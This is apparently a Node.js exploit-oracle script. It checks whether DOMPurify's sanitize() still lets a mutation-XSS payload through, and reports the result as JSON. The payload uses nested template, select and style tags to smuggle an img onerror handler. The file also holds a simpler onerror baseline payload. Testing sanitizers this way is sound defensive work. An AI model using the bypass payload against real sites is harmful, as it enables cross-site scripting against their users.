'use strict';

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let operation_completed = false;

try {
  const { JSDOM } = require('jsdom');
  const createDOMPurify = require('dompurify');

  const window = new JSDOM('').window;
  const DOMPurifyInstance = createDOMPurify(window);

  if (!DOMPurifyInstance || typeof DOMPurifyInstance.sanitize !== 'function') {
    throw new Error('Unable to obtain a usable DOMPurify instance');
  }

  // --- Benign input first: prove normal sanitize() works ---
  const benignInput = '<div><b>hello</b> world</div>';
  const benignOutput = DOMPurifyInstance.sanitize(benignInput);

  if (typeof benignOutput !== 'string' || !benignOutput.includes('hello') || !benignOutput.includes('world')) {
    throw new Error('Benign sanitize operation did not behave as expected: ' + JSON.stringify(benignOutput));
  }

  // Also verify a known-dangerous simple payload is removed, confirming
  // the sanitizer is actually functioning (not a no-op / broken install).
  const simpleDangerous = '<img src=x onerror="alert(1)">';
  const simpleSanitized = DOMPurifyInstance.sanitize(simpleDangerous);
  if (/onerror/i.test(simpleSanitized)) {
    throw new Error('Baseline sanitize() failed to strip a trivial onerror attribute; environment is unreliable: ' + JSON.stringify(simpleSanitized));
  }

  // Benign calls succeeded; from here on exceptions count as "blocked".
  operation_completed = true;

  // --- Malicious input: mXSS payload exploiting nested template/select/style
  // parsing quirks. The HTML parser treats content inside <template><select>
  // specially; a <style> opening tag inside that context can be mis-parsed
  // such that DOMPurify's sanitize pass does not see the img/onerror as
  // being inside a disallowed/escaped context, allowing it to survive into
  // the serialized output (CVE fixed in dompurify > 3.2.3).
  const maliciousInput =
    '<template><select><style></select><img src=x onerror="window.__DOMPURIFY_ORACLE_PWNED__=true"></style></select></template>';

  const maliciousOutput = DOMPurifyInstance.sanitize(maliciousInput);

  const hasOnerrorAttr = /onerror\s*=/i.test(maliciousOutput);
  const hasScriptTag = /<script/i.test(maliciousOutput);
  const hasImgWithHandler = /<img[^>]*onerror/i.test(maliciousOutput);

  let exploit_succeeded = false;
  let evidence;

  if (hasOnerrorAttr || hasScriptTag || hasImgWithHandler) {
    exploit_succeeded = true;
    evidence =
      'Sanitized output retained a dangerous executable construct (onerror attribute or script tag) ' +
      'surviving DOMPurify.sanitize() for mXSS payload: ' + JSON.stringify(maliciousOutput);
  } else {
    exploit_succeeded = false;
    evidence =
      'DOMPurify.sanitize() correctly neutralized the mXSS payload; no dangerous attributes or tags survived. ' +
      'Sanitized output: ' + JSON.stringify(maliciousOutput);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  if (!operation_completed) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Setup, module-resolution, fixture, or benign-operation exception: ' + (err && err.stack ? err.stack : String(err))
    });
  } else {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'Malicious input triggered an exception after benign operation succeeded (treated as blocked): ' + (err && err.stack ? err.stack : String(err))
    });
  }
}
